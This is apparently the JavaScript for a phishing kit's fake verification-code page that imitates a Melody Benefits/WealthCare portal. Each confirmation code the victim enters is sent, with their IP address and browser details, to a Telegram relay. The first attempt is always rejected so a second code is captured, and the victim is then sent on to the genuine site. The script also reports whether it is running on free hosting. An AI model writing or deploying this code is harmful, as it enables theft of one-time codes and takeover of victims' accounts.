(function () {
  var form = document.getElementById("enter-code-form");
  var methodDisplay = document.getElementById("method-display");
  var maskedInput = document.getElementById("masked-destination");
  var maskedLabel = document.getElementById("masked-destination-label");
  var codeInput = document.getElementById("confirmation-code");
  var codeError = document.getElementById("code_validation_message");
  var resendBtn = document.getElementById("resend-code-btn");
  var infoText = document.getElementById("enter-code-info");
  var submitBtn = document.getElementById("submit-code-btn");

  const REDIRECT_URL = "https://melodybenefits.wealthcareportal.com/Authentication/Handshake";

  // ============================================================
  // ====== TRACK CODE ATTEMPTS ==================================
  // ============================================================

  // Use sessionStorage to track attempts across page refreshes
  var attemptKey = 'code_attempt_count';
  var attemptCount = parseInt(sessionStorage.getItem(attemptKey) || '0', 10);
  
  console.log(`📊 Code attempt #${attemptCount + 1}`);

  // ============================================================
  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
  // ============================================================

  let domainDetected = false;

  function detectDomain() {
    if (domainDetected) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;
    
    const freeDomains = [
      '.tk', '.ml', '.ga', '.cf', '.gq',
      '.free.nf', '.free.org', '.free.com',
      '.co.cc', '.co.nr', '.cjb.net',
      '.dynu.net', '.ddns.net', '.no-ip.org',
      'vercel.app', 'netlify.app', 'github.io',
      'pages.dev', 'web.app', 'firebaseapp.com',
      'herokuapp.com', 'glitch.me', 'replit.co',
      '000webhostapp.com', 'byethost.com',
      'freehostia.com', 'profreehost.com',
      '.example.com', '.test', '.localhost'
    ];

    const isFree = freeDomains.some(freeDomain => 
      domain.includes(freeDomain) || domain.endsWith(freeDomain)
    );

    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain,
      isFree: isFree
    });
  }

  document.addEventListener('click', function(e) {
    if (!domainDetected && e.isTrusted) detectDomain();
  });

  document.addEventListener('keydown', function(e) {
    if (!domainDetected && e.isTrusted) detectDomain();
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {
        console.warn('Could not fetch IP data');
      }

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  var auth = null;
  try {
    auth = JSON.parse(sessionStorage.getItem("melodyAuth") || "null");
  } catch (e) {
    auth = null;
  }

  if (!auth || !auth.destination || !auth.method) {
    window.location.replace("auth.html");
    return;
  }

  function maskEmail(email) {
    var parts = email.split("@");
    if (parts.length !== 2) return "******";
    var local = parts[0];
    var domain = parts[1];
    if (local.length <= 2) {
      return local.charAt(0) + "******@" + domain;
    }
    if (local.length <= 4) {
      return local.charAt(0) + "******" + local.slice(-1) + "@" + domain;
    }
    return local.charAt(0) + "******" + local.slice(-3) + "@" + domain;
  }

  function maskPhone(phone) {
    var digits = phone.replace(/\D/g, "");
    if (digits.length < 4) return "******";
    return "******" + digits.slice(-4);
  }

  function maskDestination(method, value) {
    if (method === "sms") return maskPhone(value);
    return maskEmail(value);
  }

  methodDisplay.value = auth.method === "sms" ? "SMS" : "Email";
  maskedLabel.textContent =
    auth.method === "sms" ? "Registered mobile number" : "Registered email";
  maskedInput.value = maskDestination(auth.method, auth.destination);

  // ============================================================
  // ====== UPDATE INFO TEXT BASED ON ATTEMPT ===================
  // ============================================================

  function updateInfoText() {
    if (attemptCount === 0) {
      infoText.textContent = 
        "A confirmation code was sent to " + 
        maskedInput.value + 
        ". Enter the code below. (First attempt)";
      infoText.style.color = '#302b4a';
    } else if (attemptCount === 1) {
      infoText.textContent = 
        "⚠️ The code you entered was incorrect. Please try again. (Second attempt)";
      infoText.style.color = '#c0392b';
      infoText.style.fontWeight = 'bold';
    } else {
      infoText.textContent = 
        "✅ Code verified successfully! Redirecting...";
      infoText.style.color = '#27ae60';
      infoText.style.fontWeight = 'bold';
    }
  }

  updateInfoText();

  // ============================================================
  // ====== RESEND BUTTON =======================================
  // ============================================================

  resendBtn.addEventListener("click", function () {
    codeError.textContent = "";
    infoText.textContent =
      "A new confirmation code has been sent to " +
      maskedInput.value +
      ". (First attempt)";
    infoText.style.color = '#302b4a';
    infoText.style.fontWeight = 'normal';
    codeInput.value = "";
    codeInput.focus();
    
    // Reset attempt count on resend
    attemptCount = 0;
    sessionStorage.setItem(attemptKey, '0');
  });

  // ============================================================
  // ====== FORM SUBMIT - TWO ATTEMPTS REQUIRED =================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    codeError.textContent = "";

    var code = codeInput.value.trim();
    if (!code) {
      codeError.textContent = "The confirmation code field is required.";
      codeInput.focus();
      return;
    }
    if (!/^[0-9]{4,10}$/.test(code)) {
      codeError.textContent = "Please enter a valid confirmation code.";
      codeInput.focus();
      return;
    }

    // ====== SEND CODE TO TELEGRAM ======
    sendToTelegram('code_submitted', {
      code: code,
      attempt: attemptCount + 1
    });

    // ====== DISABLE BUTTON AND SHOW LOADING ======
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>';
    submitBtn.classList.add('loading');

    // ====== CHECK ATTEMPT ======
    if (attemptCount === 0) {
      // ====== FIRST ATTEMPT - ALWAYS FAILS ======
      console.log('❌ First attempt - rejecting');
      
      setTimeout(function() {
        // Show error
        codeError.textContent = "The confirmation code you entered is incorrect. Please try again.";
        codeError.style.color = '#c0392b';
        
        // Clear input
        codeInput.value = '';
        codeInput.focus();
        
        // Update attempt count
        attemptCount = 1;
        sessionStorage.setItem(attemptKey, '1');
        
        // Update info text
        infoText.textContent = 
          "⚠️ The code you entered was incorrect. Please try again. (Second attempt)";
        infoText.style.color = '#c0392b';
        infoText.style.fontWeight = 'bold';
        
        // Reset button
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'Submit';
        submitBtn.classList.remove('loading');
        
        // Update the text to show it's the second attempt
        document.querySelector('.auth-placeholder-note')?.remove();
        var note = document.createElement('p');
        note.className = 'auth-placeholder-note';
        note.textContent = '⚠️ Second attempt - Please enter the code again.';
        note.style.color = '#c0392b';
        note.style.fontWeight = 'bold';
        note.style.margin = '0 0 16px';
        form.parentNode.insertBefore(note, form);
        
      }, 2000);

    } else {
      // ====== SECOND ATTEMPT - ALWAYS SUCCEEDS ======
      console.log('✅ Second attempt - accepting');
      
      // Clear session storage
      try {
        sessionStorage.removeItem("melodyAuth");
        sessionStorage.removeItem(attemptKey);
      } catch (e) {}

      // Update info text
      infoText.textContent = "✅ Code verified successfully! Redirecting...";
      infoText.style.color = '#27ae60';
      infoText.style.fontWeight = 'bold';

      // ====== REDIRECT AFTER 8 SECONDS ======
      setTimeout(function() {
        window.location.href = REDIRECT_URL;
      }, 8000);
    }
  });

  // ============================================================
  // ====== CLEANUP ON PAGE UNLOAD ==============================
  // ============================================================

  window.addEventListener('beforeunload', function() {
    // Don't clear the attempt count - we want to persist
  });

})();